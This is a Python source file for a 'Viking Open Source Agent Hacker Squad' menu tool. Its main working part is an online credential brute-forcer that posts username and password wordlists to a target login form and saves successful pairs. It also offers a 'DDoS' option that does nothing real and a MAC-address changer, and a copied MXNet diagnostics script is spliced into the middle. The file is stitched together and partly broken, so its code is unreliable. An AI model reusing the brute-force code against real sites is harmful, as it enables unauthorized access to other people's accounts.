#version
version ="3.5 BETA"
#infos
liz ="  Open Source [PRIVAT ONLY]"
loop =1
#coloret text
print("\033[1;31;40m")
#imports
import main as er
import requests
import random
import time
import sys
from time import sleep
import os
from bs4 import BeautifulSoup
#intro
print("https://github.com/vikingthereal/Viking-Open-Source-Agent-Hacker-Squad")
#def
from sys import exit
import requests
def open_ressources(file_path):
    return [item.replace("\n", "") for item in open(file_path).readlines()]


# GLOBAL CONSTANT VARIABLES -------
# list of potential incorrect message in the page if it doesn't succeed
INCORRECT_MESSAGE = open_ressources('./ressources/incorrectMessage.txt')
# list of potential success message in the page if it succeed
SUCCESS_MESSAGE = open_ressources('./ressources/successMessage.txt')
# Getting list of potentials password
PASSWORDS = open_ressources('./ressources/passwords.txt')
# Getting list of user to test with
USERS = open_ressources('./ressources/users.txt')
# Limit of trying connections
LIMIT_TRYING_ACCESSING_URL = 7



def process_request(request, user, password, failed_aftertry, user_field, password_field):
    """[summary]

    Arguments:
        request {[type]} -- [description]
        user {[type]} -- [description]
        password {[type]} -- [description]
        failed_aftertry {[type]} -- [description]
        user_field {[type]} -- [description]
        password_field {[type]} -- [description]
    """
    if "404" in request.text or "404 - Not Found" in request.text or request.status_code == 404:
        if failed_aftertry > LIMIT_TRYING_ACCESSING_URL:
            print ("[+] Connection failed : Trying again ....")
            return
        else:
            failed_aftertry = failed_aftertry+1
            print ("[+] Connection failed : 404 Not Found (Verify your url)")
    else:
        # if you want to see the text result remove the comment here
        #print data.text
        if INCORRECT_MESSAGE[0] in request.text or INCORRECT_MESSAGE[1] in request.text:
            print ("[+] Failed to connect with:\n user: "+user+" and password: "+password)
        else:
            if SUCCESS_MESSAGE[0] in request.text or SUCCESS_MESSAGE[1] in request.text:
                result = "\n--------------------------------------------------------------"
                result += "\\OK!! \nTheese Credentials succeed:\n> user: "+user+" and password: "+password
                result += "--------------------------------------------------------------"
                with open("./results.txt", "w+") as frr:
                    frr.write(result)
                print("[+] A Match succeed 'user: "+user+" and password: "+password+"' and have been saved at ./results.txt")
                return
            else:
                print ("Trying theese parameters: user: "+user+" and password: "+password)




def process_user(user, url, failed_aftertry, user_field, password_field):
    """[summary]

    Arguments:
        user {[type]} -- [description]
        url {[type]} -- [description]
        failed_aftertry {[type]} -- [description]
        user_field {[type]} -- [description]
        password_field {[type]} -- [description]
    """
    for password in PASSWORDS:
        dados = {user_field: user.replace('\n', ''),
                password_field: password.replace('\n', '')}
        print ("[+]", dados)
        # Doing the post form
        request = requests.post(url, data=dados)

        process_request(request, user, password, failed_aftertry, user_field, password_field)



def try_connection(url, user_field, password_field):
    """[summary]

    Arguments:
        url {[type]} -- [description]
        user_field {[type]} -- [description]
        password_field {[type]} -- [description]
    """
    print ("[+] Connecting to: "+url+"......\n")
    # Put the target email you want to hack
    #user_email = raw_input("\nEnter EMAIL / USERNAME of the account you want to hack:")
    failed_aftertry = 0
    for user in USERS:
        process_user(user, url, failed_aftertry, user_field, password_field)



def manual_mode():
    """[summary]
    """
    print("[+] Manual mode selected ")
    print("[+] After inspecting the LOGIN <form />, please fill here :")
    # Field's Form -------
    # The link of the website
    url = input("\n[+] Enter the target URL (it's the 'action' attribute on the Login form):")
    # The user_field in the form of the login
    user_field = input("\n[+] Enter the User Field  (it's the 'name' attribute on the Login form for the username/email):")
    # The password_field in the form
    password_field = input("\n[+] Enter the Password field  (it's the 'name' attribute on the Login form for the password):")


    try_connection(url, user_field, password_field)


def extract_field_form(html_contain):
    """[summary]

    Arguments:
        html_contain {[type]} -- [description]
    """
    print("[+] Starting extraction...")
def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(3. / 100)
slowprint("LOAD...          ")
def ssart():
    import sys
    import os
    import time
    print(" ")
    print("WIFI CONNECTION)")
    print("")
    os.system('ifconfig eth0 down')
    dire=input("THE NEW MAC-ADDRESS")
    os.system('ifconfig eth0 down')
    os.system('macchanger -m'+(dire)+' eth0')
    os.system('ifconfig eth0 up')
    print("done")
def main():
    """[summary]
    """
    os.system("clear")
    print("")
    print("")
    print(version,liz)
    print(" X          __         __          X")
    print("           \  \  ___  /  /         ")
    print("            \  \/ _ \/  /          ")
    print("             \  \/ \/  /           ")
    print("              \  \_/  /            ")
    print("             /  \    / \           ")
    print(" X          /__/\___/\__\          X")
    print("Viking Open Source Agent Hacker Squad")
    anw =input("PRESS ANY KEY TO START BRUTE FORCE")
    manual_mode()
    er.interface()
if __name__ == '__main__':
    main()

import platform, subprocess, sys, os
import socket, time
try:
    from urllib.request import urlopen
    from urllib.parse import urlparse
except ImportError:
    from urlparse import urlparse
    from urllib2 import urlopen
import argparse

def parse_args():
    """Parse arguments."""
    parser = argparse.ArgumentParser(
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
        description='Diagnose script for checking the current system.')
    choices = ['python', 'pip', 'mxnet', 'os', 'hardware', 'network']
    for choice in choices:
        parser.add_argument('--' + choice, default=1, type=int,
                            help='Diagnose {}.'.format(choice))
    parser.add_argument('--region', default='', type=str,
                        help="Additional sites in which region(s) to test. \
                        Specify 'cn' for example to test mirror sites in China.")
    parser.add_argument('--timeout', default=10, type=int,
                        help="Connection test timeout threshold, 0 to disable.")
    args = parser.parse_args()
    return args

URLS = {
    'MXNet': 'https://github.com/apache/incubator-mxnet',
    'Gluon Tutorial(en)': 'http://gluon.mxnet.io',
    'Gluon Tutorial(cn)': 'https://zh.gluon.ai',
    'FashionMNIST': 'https://apache-mxnet.s3-accelerate.dualstack.amazonaws.com/gluon/dataset/fashion-mnist/train-labels-idx1-ubyte.gz',
    'PYPI': 'https://pypi.python.org/pypi/pip',
    'Conda': 'https://repo.continuum.io/pkgs/free/',
}
REGIONAL_URLS = {
    'cn': {
        'PYPI(douban)': 'https://pypi.douban.com/',
        'Conda(tsinghua)': 'https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/',
    }
}

def test_connection(name, url, timeout=10):
    """Simple connection test"""
    urlinfo = urlparse(url)
    start = time.time()
    try:
        ip = socket.gethostbyname(urlinfo.netloc)
    except Exception as e:
        print('Error resolving DNS for {}: {}, {}'.format(name, url, e))
        return
    dns_elapsed = time.time() - start
    start = time.time()
    try:
        _ = urlopen(url, timeout=timeout)
    except Exception as e:
        print("Error open {}: {}, {}, DNS finished in {} sec.".format(name, url, e, dns_elapsed))
        return
    load_elapsed = time.time() - start
    print("Timing for {}: {}, DNS: {:.4f} sec, LOAD: {:.4f} sec.".format(name, url, dns_elapsed, load_elapsed))

def check_python():
    print('----------Python Info----------')
    print('Version      :', platform.python_version())
    print('Compiler     :', platform.python_compiler())
    print('Build        :', platform.python_build())
    print('Arch         :', platform.architecture())

def check_pip():
    print('------------Pip Info-----------')
    try:
        import pip
        print('Version      :', pip.__version__)
        print('Directory    :', os.path.dirname(pip.__file__))
    except ImportError:
        print('No corresponding pip install for current python.')

def check_mxnet():
    print('----------MXNet Info-----------')
    try:
        import mxnet
        print('Version      :', mxnet.__version__)
        mx_dir = os.path.dirname(mxnet.__file__)
        print('Directory    :', mx_dir)
        commit_hash = os.path.join(mx_dir, 'COMMIT_HASH')
        with open(commit_hash, 'r') as f:
            ch = f.read().strip()
            print('Commit Hash   :', ch)
    except ImportError:
        print('No MXNet installed.')
    except Exception as e:
        import traceback
        if not isinstance(e, IOError):
            print("An error occured trying to import mxnet.")
            print("This is very likely due to missing missing or incompatible library files.")
        print(traceback.format_exc())

def check_os():
    print('----------System Info----------')
    print('Platform     :', platform.platform())
    print('system       :', platform.system())
    print('node         :', platform.node())
    print('release      :', platform.release())
    print('version      :', platform.version())

def check_hardware():
    print('----------Hardware Info----------')
    print('machine      :', platform.machine())
    print('processor    :', platform.processor())
    if sys.platform.startswith('darwin'):
        pipe = subprocess.Popen(('sysctl', '-a'), stdout=subprocess.PIPE)
        output = pipe.communicate()[0]
        for line in output.split(b'\n'):
            if b'brand_string' in line or b'features' in line:
                print(line.strip())
    elif sys.platform.startswith('linux'):
        subprocess.call(['lscpu'])
    elif sys.platform.startswith('win32'):
        subprocess.call(['wmic', 'cpu', 'get', 'name'])
if __name__ == '__main__':
    args = parse_args()
    if args.python:
        check_python()

    if args.pip:
        check_pip()

    if args.mxnet:
        check_mxnet()

    if args.os:
        check_os()

    if args.hardware:
        check_hardware()

    if args.network:
        check_network(args)
def ddos():
    os.system("clear")
    print("")
    print("")
    print(version,liz)
    print(" X          __         __          X")
    print("           \  \  ___  /  /         ")
    print("            \  \/ _ \/  /          ")
    print("             \  \/ \/  /           ")
    print("              \  \_/  /            ")
    print("             /  \    / \           ")
    print(" X          /__/\___/\__\          X")
    print("Viking Open Source Agent Hacker Squad")
    webside =input("WEBSIDE THAT BE DDOS:")
    web = requests.get(webside).content
    soup = BeautifulSoup(web, "html5lib")
    print("DDOS ATACK...")
    er.ddos()
def SSS():
    os.system("clear")
    print("")
    print("")
    print(version)
    print(" X          __         __          X")
    print("           \  \  ___  /  /         ")
    print("            \  \/ _ \/  /          ")
    print("             \  \/ \/  /           ")
    print("              \  \_/  /            ")
    print("             /  \    / \           ")
    print(" X          /__/\___/\__\          X")
    print("Viking Open Source Agent Hacker Squad")
    er.check_python()
    er.check_pip
    er.check_mxnet
    er.check_os()
    er.check_hardware()
    continiue =input("PRESS ANY KEY TO CONTINIUE...")
    er.interface()
def loadinterface():
    os.system("clear")
    slowprint("IMPORT DATAS...")
    print("")
    slowprint("LOAD HACKING TOOLS...")
    print("")
    slowprint("FINISHING LOADING...")
    print("")
    time.sleep(0.9)
    os.system("clear")
    slowprint("LOADING BLOCKS...")
    time.sleep(0.5)
    print("BLOCKS: ",random.randint(0,1000),random.randint(0,1000))
    print("BLOCKS: ",random.randint(0,1000),random.randint(0,1000))
    print("BLOCKS: ",random.randint(0,1000),random.randint(0,1000))
    print("BLOCKS: ",random.randint(0,1000),random.randint(0,1000))
    time.sleep(0.9)
    er.interface()
def OBF():
    er.main()
    er.interface()
def IaM():
    #FOR MODS
    #code of mod
    er.mods()
    #end
    er.interface()
def mods():
    os.system("clear")
    print("")
    print("")
    print(version,liz)
    print(" X          __         __          X")
    print("           \  \  ___  /  /         ")
    print("            \  \/ _ \/  /          ")
    print("             \  \/ \/  /           ")
    print("              \  \_/  /            ")
    print("             /  \    / \           ")
    print(" X          /__/\___/\__\          X")
    print("Viking Open Source Agent Hacker Squad")
    print("NO MOD INSTALED")
    ncc =input("PRESS ANY KEY TO CONTINIUE...")
    er.interface()
def crdits():
    os.system("clear")
    print("BY:      V.T")
    print("CODE:    V.T")
    print("USER:    Viking")
    print("GITHUB:  https://github.com/vikingthereal")
    print("")
    print("Open Source 2020")
    ncc =input("PRESS ANY KEY TO CONTINIUE...")
def cve():
    os.system("clear")
    print("")
    print("")
    print(version,liz)
    print(" X          __         __          X")
    print("           \  \  ___  /  /         ")
    print("            \  \/ _ \/  /          ")
    print("             \  \/ \/  /           ")
    print("              \  \_/  /            ")
    print("             /  \    / \           ")
    print(" X          /__/\___/\__\          X")
    print("Viking Open Source Agent Hacker Squad")
    er.ssart()
    time.sleep(4.0)
    er.interface()
def standby():
    os.system("clear")
    slowprint("11001101011001110")
    slowprint("11001001001001101")
    slowprint("11010110010110000")
    slowprint("01001100011100100")
    standby =input("11001101011001110")
def wronkng():
    print('''
    !!! AH AH AH ... YOU DONT SAY THE MAXIC WORD !!!
    ''')
    cfg =input("")
    os.system("clear")
    print("")
    print(version,liz)
    print(" X          __         __          X")
    print("           \  \  ___  /  /         ")
    print("            \  \/ _ \/  /          ")
    print("             \  \/ \/  /           ")
    print("              \  \_/  /            ")
    print("             /  \    / \           ")
    print(" X          /__/\___/\__\          X")
    print("Viking Open Source Agent Hacker Squad")
    er.login()
def btuz():
    os.system("clear")
    print("")
    print(version,liz)
    print(" X          __         __          X")
    print("           \  \  ___  /  /         ")
    print("            \  \/ _ \/  /          ")
    print("             \  \/ \/  /           ")
    print("              \  \_/  /            ")
    print("             /  \    / \           ")
    print(" X          /__/\___/\__\          X")
    print("Viking Open Source Agent Hacker Squad")
    hostname = socket.gethostname()    
    IPAddr = socket.gethostbyname(hostname)    
    print("Your Computer Name is:" + hostname)    
    print("Your Computer IP Address is:" + IPAddr)
    aser =input("")
    er.interface()
def interface():
    #Choise
    os.system("clear")
    print("")
    print("")
    print(version,liz)
    print(" X          __         __          X")
    print("           \  \  ___  /  /         ")
    print("            \  \/ _ \/  /          ")
    print("             \  \/ \/  /           ")
    print("              \  \_/  /            ")
    print("             /  \    / \           ")
    print(" X          /__/\___/\__\          X")
    print("Viking Open Source Agent Hacker Squad")
    print("-------------------------------------")
    print("-1 Online-Brute-Force           [OBF]")
    print("-2 Web-DDos-Atack               [WDa]")
    print("-3 Change WIFI Mac-Adress       [CWM]")
    print("-4 See System Status            [SSs]")
    print("-5 Import a Mod                 [IaM]")
    print("-6 See Credits                  [SC] ")
    print("-7 Stand By                     [SB]")
    print("-8 IP Finder                    [IF]")
    print("")
    print("-0 Logout and exit")
    print("-------------------------------------")
    print(UPDATE_OPEN)
    #wait for choise
    anw = int(input("Choice:"))
    if anw == 1:er.OBF()
    elif anw ==4:er.SSS()
    elif anw ==3:er.cve()
    elif anw ==2:er.ddos()
    elif anw ==5:er.IaM()
    elif anw ==6:er.crdits()
    elif anw ==7:er.standby()
    elif anw ==8:er.btuz()
    elif anw ==0:er.login()
    er.interface()
#.txt infomations
UPDATE_OPEN = open_ressources('./updatas/updatas.txt')
USERNAME = open_ressources('./ressources/username.txt')
PASSWORD = open_ressources('./ressources/password.txt')
#login
print("")
print(version,liz)
print(" X          __         __          X")
print("           \  \  ___  /  /         ")
print("            \  \/ _ \/  /          ")
print("             \  \/ \/  /           ")
print("              \  \_/  /            ")
print("             /  \    / \           ")
print(" X          /__/\___/\__\          X")
print("Viking Open Source Agent Hacker Squad")
def login():
    user_name ="search..."
    password_name ="search..."
    user_name =input("USERNAME=")
    if user_name ==str("admin"):password_name =input("PASSWORD=")
    if password_name ==str("root"):er.loadinterface()
    print("!!! WRONG !!!")
    os.system("clear")
    er.wronkng()
er.login()